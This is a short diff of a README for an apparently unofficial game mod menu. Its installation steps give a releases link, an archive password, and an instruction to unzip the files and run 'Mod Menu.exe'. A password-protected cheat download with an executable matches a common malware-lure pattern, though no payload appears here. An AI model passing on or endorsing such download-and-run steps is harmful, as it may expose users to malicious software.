@@ -28,8 +28,8 @@ This unofficial mod menu provides players with various quality-of-life improveme
   - 📜 Mission Progress Unlocker
 
 ## ⚙️ Installation
-1. Download latest release from [Releases](https://github.com/elgasgareniw/repo/releases)
 **PASSW0RD: 0012**
+1. Download latest release from [Releases](https://github.com/elgasgareniw/repo/releases)
 2. Unzip the files to any file
 3. Open Mod Menu.exe
 
